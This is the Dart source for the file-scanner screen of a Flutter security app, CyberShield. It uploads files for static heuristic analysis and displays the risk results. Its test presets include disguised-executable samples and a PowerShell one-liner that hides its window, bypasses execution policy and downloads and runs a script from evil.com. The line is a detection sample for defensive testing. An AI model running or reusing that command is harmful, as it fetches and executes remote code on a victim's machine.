// File Threat Scanner Screen for CyberShield

import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:file_picker/file_picker.dart';
import 'package:cybershield/core/theme/app_theme.dart';
import 'package:cybershield/core/widgets/cyber_card.dart';
import 'package:cybershield/core/widgets/cyber_badge.dart';
import 'package:cybershield/core/widgets/cyber_loading_state.dart';
import 'package:cybershield/core/widgets/cyber_error_state.dart';
import 'package:cybershield/core/widgets/nav_drawer.dart';
import 'package:cybershield/core/navigation/app_router.dart';
import 'package:cybershield/core/services/api_service.dart';
import 'package:cybershield/core/services/firestore_history_service.dart';
import 'package:cybershield/core/models/file_scan_result.dart';

class _FilePreset {
  final String label;
  final String filename;
  final String subtitle;
  final IconData icon;
  final Color color;
  final String base64Content;

  const _FilePreset({
    required this.label,
    required this.filename,
    required this.subtitle,
    required this.icon,
    required this.color,
    required this.base64Content,
  });
}

class FileScannerScreen extends StatefulWidget {
  const FileScannerScreen({super.key});

  @override
  State<FileScannerScreen> createState() => _FileScannerScreenState();
}

class _FileScannerScreenState extends State<FileScannerScreen> {
  String? _selectedFilePath;
  Uint8List? _selectedFileBytes;
  String? _selectedFilename;
  int? _selectedFileSize;

  bool _isLoading = false;
  String? _errorMessage;
  FileScanResult? _scanResult;
  bool _showArchiveContents = false;

  // Preset synthetic file samples
  static final List<_FilePreset> _presets = [
    _FilePreset(
      label: 'Camouflaged Executable',
      filename: 'financial_statement.pdf',
      subtitle: 'Critical: Windows PE binary disguised as .pdf',
      icon: Icons.picture_as_pdf_rounded,
      color: const Color(0xFFFF3B30),
      base64Content: base64Encode(
        utf8.encode('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode.'),
      ),
    ),
    _FilePreset(
      label: 'Double Extension Trick',
      filename: 'urgent_invoice.docx.exe',
      subtitle: 'Critical: Camouflaged executable posing as Word doc',
      icon: Icons.description_rounded,
      color: const Color(0xFFFF2D55),
      base64Content: base64Encode(
        utf8.encode('MZ\x90\x00\x03\x00fake_executable_binary_content'),
      ),
    ),
    _FilePreset(
      label: 'Stealth PowerShell Script',
      filename: 'system_optimizer.ps1',
      subtitle: 'High Risk: Hidden console window + remote payload download',
      icon: Icons.terminal_rounded,
      color: const Color(0xFFFF9500),
      base64Content: base64Encode(
        utf8.encode(
          'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1") | IEX',
        ),
      ),
    ),
    _FilePreset(
      label: 'Clean Text Notes',
      filename: 'meeting_agenda.txt',
      subtitle: 'Safe: Standard plain text document',
      icon: Icons.text_snippet_rounded,
      color: const Color(0xFF34C759),
      base64Content: base64Encode(
        utf8.encode('CyberShield project sprint retrospective and roadmap notes.'),
      ),
    ),
  ];

  Future<void> _pickFile() async {
    try {
      final files = await FilePicker.pickFiles(
        type: FileType.any,
      );

      if (files.isNotEmpty) {
        final file = files.first;
        final path = file.path;
        final int size = await file.xFile.length();
        Uint8List? bytes;
        if (path == null || path.isEmpty) {
          bytes = await file.xFile.readAsBytes();
        }

        setState(() {
          _selectedFilePath = (path != null && path.isNotEmpty) ? path : null;
          _selectedFileBytes = bytes;
          _selectedFilename = file.name;
          _selectedFileSize = size;
          _errorMessage = null;
          _scanResult = null;
        });
      }
    } catch (e) {
      setState(() {
        _errorMessage = 'Could not select file: $e';
      });
    }
  }

  void _loadPreset(_FilePreset preset) {
    try {
      final bytes = base64Decode(preset.base64Content);
      setState(() {
        _selectedFilePath = null;
        _selectedFileBytes = bytes;
        _selectedFilename = preset.filename;
        _selectedFileSize = bytes.length;
        _errorMessage = null;
        _scanResult = null;
      });
    } catch (e) {
      setState(() {
        _errorMessage = 'Could not load preset: $e';
      });
    }
  }

  Future<void> _analyzeFile() async {
    if ((_selectedFilePath == null && _selectedFileBytes == null) ||
        _selectedFilename == null) {
      setState(() {
        _errorMessage = 'Please select a file to inspect first.';
      });
      return;
    }

    setState(() {
      _isLoading = true;
      _errorMessage = null;
      _scanResult = null;
    });

    try {
      final FileScanResult result;
      if (_selectedFilePath != null) {
        result = await ApiService.scanFileFromPath(
          _selectedFilePath!,
          filename: _selectedFilename,
        );
      } else {
        result = await ApiService.scanFile(
          _selectedFileBytes!,
          filename: _selectedFilename!,
        );
      }

      if (result.isError) {
        setState(() {
          _isLoading = false;
          _errorMessage = result.errorMessage ?? 'File analysis failed.';
        });
        return;
      }

      setState(() {
        _isLoading = false;
        _scanResult = result;
      });

      // Save to Cloud Firestore
      if (FirestoreHistoryService.instance.isAuthenticated) {
        await FirestoreHistoryService.instance.recordScan(
          scanType: 'FILE',
          target: result.filename,
          riskScore: result.riskScore,
          classification: result.classification,
          status: result.classification,
          summary: 'Risk Score: ${result.riskScore}/100 (${result.classification}) - ${result.detectedMime}',
          result: result.toJson(),
          metadata: {
            'filename': result.filename,
            'file_size_bytes': result.fileSizeBytes,
            'detected_mime': result.detectedMime,
            'file_extension': result.fileExtension,
            'is_archive': result.isArchive,
          },
        );
      }
    } catch (e) {
      setState(() {
        _isLoading = false;
        _errorMessage = 'File analysis failed: $e';
      });
    }
  }

  Color _getClassificationColor(String classification) {
    switch (classification.toLowerCase()) {
      case 'critical':
        return const Color(0xFFFF2D55);
      case 'high risk':
        return AppColors.danger;
      case 'suspicious':
        return AppColors.warning;
      case 'safe':
        return AppColors.safe;
      default:
        return AppColors.textSecondary;
    }
  }

  BadgeType _getBadgeType(String classification) {
    switch (classification.toLowerCase()) {
      case 'critical':
      case 'high risk':
        return BadgeType.danger;
      case 'suspicious':
        return BadgeType.warning;
      case 'safe':
        return BadgeType.safe;
      default:
        return BadgeType.info;
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.background,
      appBar: AppBar(
        title: const Text('File Threat Scanner'),
        leading: Builder(
          builder: (context) => IconButton(
            icon: const Icon(Icons.menu_rounded),
            onPressed: () => Scaffold.of(context).openDrawer(),
          ),
        ),
      ),
      drawer: const NavDrawer(currentRoute: AppRouter.fileScanner),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(16),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              _buildUploadSection(),
              const SizedBox(height: 16),
              _buildPresetsSection(),
              const SizedBox(height: 16),
              if (_isLoading)
                const CyberLoadingState(
                  title: 'Inspecting File Signatures...',
                  subtitle: 'Checking magic bytes, extension mismatch, and archive safety',
                ),
              if (_errorMessage != null)
                CyberErrorState(message: _errorMessage!, onRetry: _analyzeFile),
              if (_scanResult != null && !_isLoading)
                _buildResultsSection(_scanResult!),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildUploadSection() {
    return CyberShieldCard(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: AppColors.primary.withValues(alpha: 0.1),
              shape: BoxShape.circle,
            ),
            child: const Icon(Icons.attach_file_rounded, color: AppColors.primary, size: 36),
          ),
          const SizedBox(height: 12),
          const Text(
            'Select File to Inspect',
            style: TextStyle(
              color: AppColors.textPrimary,
              fontSize: 15,
              fontWeight: FontWeight.w700,
            ),
          ),
          const SizedBox(height: 4),
          const Text(
            'Supported: Documents (PDF, DOCX), Archives (ZIP, TAR, GZ), Scripts (PS1, BAT, VBS, JS), Executables (EXE, DLL). Max 25MB.',
            textAlign: TextAlign.center,
            style: TextStyle(color: AppColors.textSecondary, fontSize: 11),
          ),
          const SizedBox(height: 16),
          OutlinedButton.icon(
            onPressed: _pickFile,
            icon: const Icon(Icons.folder_open_rounded, color: AppColors.primary),
            label: const Text('Choose File from Device', style: TextStyle(color: AppColors.primary)),
            style: OutlinedButton.styleFrom(
              side: const BorderSide(color: AppColors.primary),
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
          ),
          if (_selectedFilename != null) ...[
            const SizedBox(height: 14),
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: AppColors.surfaceLight,
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: AppColors.cardBorder),
              ),
              child: Row(
                children: [
                  const Icon(Icons.insert_drive_file_rounded, color: AppColors.safe, size: 24),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          _selectedFilename!,
                          style: const TextStyle(
                            color: AppColors.textPrimary,
                            fontSize: 12,
                            fontWeight: FontWeight.w600,
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                        if (_selectedFileSize != null)
                          Text(
                            '${(_selectedFileSize! / 1024).toStringAsFixed(1)} KB',
                            style: const TextStyle(color: AppColors.textMuted, fontSize: 10),
                          ),
                      ],
                    ),
                  ),
                  IconButton(
                    icon: const Icon(Icons.close_rounded, color: AppColors.textMuted, size: 18),
                    onPressed: () {
                      setState(() {
                        _selectedFilePath = null;
                        _selectedFileBytes = null;
                        _selectedFilename = null;
                        _selectedFileSize = null;
                        _scanResult = null;
                      });
                    },
                  ),
                ],
              ),
            ),
            const SizedBox(height: 14),
            ElevatedButton.icon(
              onPressed: _isLoading ? null : _analyzeFile,
              icon: const Icon(Icons.security_rounded),
              label: const Text('Scan File for Threats'),
              style: ElevatedButton.styleFrom(
                backgroundColor: AppColors.primary,
                foregroundColor: AppColors.background,
                padding: const EdgeInsets.symmetric(vertical: 14),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                minimumSize: const Size.fromHeight(44),
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildPresetsSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Text(
          'Quick Test File Samples',
          style: TextStyle(
            color: AppColors.textPrimary,
            fontSize: 13,
            fontWeight: FontWeight.w700,
          ),
        ),
        const SizedBox(height: 8),
        ..._presets.map((preset) {
          final isSelected = _selectedFilename == preset.filename;
          return Padding(
            padding: const EdgeInsets.only(bottom: 6),
            child: CyberShieldCard(
              onTap: () => _loadPreset(preset),
              borderColor: isSelected ? preset.color : AppColors.cardBorder,
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
              child: Row(
                children: [
                  Icon(preset.icon, color: preset.color, size: 20),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          preset.label,
                          style: TextStyle(
                            color: isSelected ? preset.color : AppColors.textPrimary,
                            fontSize: 12,
                            fontWeight: FontWeight.w700,
                          ),
                        ),
                        Text(
                          preset.subtitle,
                          style: const TextStyle(color: AppColors.textMuted, fontSize: 10),
                        ),
                      ],
                    ),
                  ),
                  if (isSelected)
                    Icon(Icons.check_circle_rounded, color: preset.color, size: 16),
                ],
              ),
            ),
          );
        }),
      ],
    );
  }

  Widget _buildResultsSection(FileScanResult result) {
    final color = _getClassificationColor(result.classification);
    final badgeType = _getBadgeType(result.classification);

    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        const Divider(color: AppColors.cardBorder, height: 32),
        const Text(
          'File Threat Assessment',
          style: TextStyle(
            color: AppColors.textPrimary,
            fontSize: 16,
            fontWeight: FontWeight.w700,
            letterSpacing: -0.2,
          ),
        ),
        const SizedBox(height: 12),

        // 1. Overall Risk Banner
        CyberShieldCard(
          borderColor: color.withValues(alpha: 0.4),
          padding: const EdgeInsets.all(16),
          child: Column(
            children: [
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          result.filename,
                          style: const TextStyle(
                            color: AppColors.textPrimary,
                            fontSize: 15,
                            fontWeight: FontWeight.w800,
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                        const SizedBox(height: 2),
                        Text(
                          '${(result.fileSizeBytes / 1024).toStringAsFixed(1)} KB • ${result.detectedMime}',
                          style: const TextStyle(color: AppColors.textMuted, fontSize: 11),
                        ),
                      ],
                    ),
                  ),
                  CyberBadge(
                    label: result.classification.toUpperCase(),
                    type: badgeType,
                  ),
                ],
              ),
              const SizedBox(height: 16),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Container(
                    width: 90,
                    height: 90,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(color: color, width: 4),
                      color: color.withValues(alpha: 0.1),
                    ),
                    child: Center(
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Text(
                            '${result.riskScore}',
                            style: TextStyle(
                              color: color,
                              fontSize: 28,
                              fontWeight: FontWeight.w900,
                            ),
                          ),
                          const Text(
                            '/ 100',
                            style: TextStyle(color: AppColors.textMuted, fontSize: 10),
                          ),
                        ],
                      ),
                    ),
                  ),
                  const SizedBox(width: 20),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        _buildStatLine('Signature', result.detectedMime),
                        const SizedBox(height: 6),
                        _buildStatLine('Extension', result.fileExtension),
                        const SizedBox(height: 6),
                        _buildStatLine('Archive Container', result.isArchive ? 'Yes' : 'No'),
                      ],
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 14),
              Text(
                result.explanation,
                style: const TextStyle(color: AppColors.textSecondary, fontSize: 12, height: 1.4),
              ),
            ],
          ),
        ),
        const SizedBox(height: 14),

        // 2. Detected Indicators Breakdown
        if (result.findingExplanations.isNotEmpty) ...[
          const Text(
            'Security Findings & Heuristics',
            style: TextStyle(color: AppColors.textPrimary, fontSize: 14, fontWeight: FontWeight.w700),
          ),
          const SizedBox(height: 8),
          ...result.findingExplanations.map((item) {
            return Padding(
              padding: const EdgeInsets.only(bottom: 8),
              child: CyberShieldCard(
                padding: const EdgeInsets.all(12),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      children: [
                        Expanded(
                          child: Text(
                            item.title,
                            style: const TextStyle(
                              color: AppColors.textPrimary,
                              fontSize: 13,
                              fontWeight: FontWeight.w700,
                            ),
                          ),
                        ),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                          decoration: BoxDecoration(
                            color: item.riskLevel.toLowerCase() == 'critical'
                                ? AppColors.danger.withValues(alpha: 0.2)
                                : AppColors.surfaceLight,
                            borderRadius: BorderRadius.circular(4),
                          ),
                          child: Text(
                            item.riskLevel.toUpperCase(),
                            style: TextStyle(
                              color: item.riskLevel.toLowerCase() == 'critical'
                                  ? AppColors.danger
                                  : AppColors.primary,
                              fontSize: 10,
                              fontWeight: FontWeight.w600,
                            ),
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 4),
                    Text(
                      'Flag: "${item.indicator}"',
                      style: const TextStyle(color: AppColors.textMuted, fontSize: 11, fontStyle: FontStyle.italic),
                    ),
                    const SizedBox(height: 4),
                    Text(
                      item.explanation,
                      style: const TextStyle(color: AppColors.textSecondary, fontSize: 11, height: 1.3),
                    ),
                  ],
                ),
              ),
            );
          }),
        ],

        // 3. Archive Contents (if archive)
        if (result.isArchive && result.archiveContents.isNotEmpty) ...[
          const SizedBox(height: 8),
          CyberShieldCard(
            padding: const EdgeInsets.all(12),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                InkWell(
                  onTap: () {
                    setState(() {
                      _showArchiveContents = !_showArchiveContents;
                    });
                  },
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text(
                        'Archive Members (${result.archiveContents.length})',
                        style: const TextStyle(
                          color: AppColors.textPrimary,
                          fontSize: 13,
                          fontWeight: FontWeight.w700,
                        ),
                      ),
                      Icon(
                        _showArchiveContents ? Icons.keyboard_arrow_up_rounded : Icons.keyboard_arrow_down_rounded,
                        color: AppColors.textSecondary,
                      ),
                    ],
                  ),
                ),
                if (_showArchiveContents) ...[
                  const Divider(color: AppColors.cardBorder, height: 16),
                  ...result.archiveContents.map((entry) {
                    return Padding(
                      padding: const EdgeInsets.symmetric(vertical: 2),
                      child: Row(
                        children: [
                          const Icon(Icons.folder_zip_rounded, size: 14, color: AppColors.primary),
                          const SizedBox(width: 6),
                          Expanded(
                            child: Text(
                              entry,
                              style: const TextStyle(color: AppColors.textSecondary, fontSize: 11),
                            ),
                          ),
                        ],
                      ),
                    );
                  }),
                ],
              ],
            ),
          ),
        ],

        // 4. Actionable Security Recommendations
        const SizedBox(height: 10),
        CyberShieldCard(
          borderColor: AppColors.primary.withValues(alpha: 0.25),
          padding: const EdgeInsets.all(14),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Row(
                children: [
                  Icon(Icons.lightbulb_outline_rounded, color: AppColors.primary, size: 18),
                  SizedBox(width: 8),
                  Text(
                    'Recommended Actions',
                    style: TextStyle(color: AppColors.primary, fontSize: 13, fontWeight: FontWeight.w700),
                  ),
                ],
              ),
              const SizedBox(height: 10),
              ...result.recommendations.map((rec) {
                return Padding(
                  padding: const EdgeInsets.only(bottom: 6),
                  child: Row(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text('• ', style: TextStyle(color: AppColors.primary, fontSize: 14)),
                      Expanded(
                        child: Text(rec, style: const TextStyle(color: AppColors.textPrimary, fontSize: 12)),
                      ),
                    ],
                  ),
                );
              }),
            ],
          ),
        ),

        // 5. Cryptographic Fingerprints (Forensics)
        if (result.sha256 != null && result.sha256!.isNotEmpty) ...[
          const SizedBox(height: 14),
          const Text(
            'Cryptographic Fingerprints (Forensics)',
            style: TextStyle(color: AppColors.textPrimary, fontSize: 14, fontWeight: FontWeight.w700),
          ),
          const SizedBox(height: 8),
          CyberShieldCard(
            padding: const EdgeInsets.all(12),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                _buildHashRow(context, 'SHA-256', result.sha256!),
                if (result.md5 != null && result.md5!.isNotEmpty) ...[
                  const Divider(color: AppColors.cardBorder, height: 16),
                  _buildHashRow(context, 'MD5', result.md5!),
                ],
              ],
            ),
          ),
        ],

        // 6. Heuristic Context Disclaimer
        const SizedBox(height: 10),
        CyberShieldCard(
          padding: const EdgeInsets.all(12),
          child: Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Icon(Icons.shield_outlined, color: AppColors.textMuted, size: 18),
              const SizedBox(width: 8),
              const Expanded(
                child: Text(
                  'CyberShield Safety Note: This assessment is generated via static heuristic inspection (magic bytes, extension analysis, and structural metadata) without executing the file. Heuristic suspicion highlights attack surface and anomalies rather than confirmed signature malware.',
                  style: TextStyle(color: AppColors.textMuted, fontSize: 10, height: 1.3),
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildHashRow(BuildContext context, String algorithm, String hash) {
    return Row(
      children: [
        Text(
          '$algorithm: ',
          style: const TextStyle(
            color: AppColors.primary,
            fontSize: 11,
            fontWeight: FontWeight.w700,
          ),
        ),
        Expanded(
          child: Text(
            hash,
            style: const TextStyle(
              color: AppColors.textPrimary,
              fontSize: 10,
              fontFamily: 'monospace',
            ),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
        ),
        IconButton(
          icon: const Icon(Icons.copy_rounded, size: 14, color: AppColors.textMuted),
          tooltip: 'Copy $algorithm hash',
          padding: EdgeInsets.zero,
          constraints: const BoxConstraints(),
          onPressed: () {
            Clipboard.setData(ClipboardData(text: hash));
            ScaffoldMessenger.of(context).showSnackBar(
              SnackBar(
                content: Text('$algorithm hash copied to clipboard.'),
                backgroundColor: AppColors.safe,
                duration: const Duration(seconds: 2),
              ),
            );
          },
        ),
      ],
    );
  }

  Widget _buildStatLine(String label, String value) {
    return Row(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      children: [
        Text(label, style: const TextStyle(color: AppColors.textSecondary, fontSize: 11)),
        const SizedBox(width: 8),
        Expanded(
          child: Text(
            value,
            textAlign: TextAlign.end,
            style: const TextStyle(color: AppColors.textPrimary, fontSize: 11, fontWeight: FontWeight.w700),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
        ),
      ],
    );
  }
}

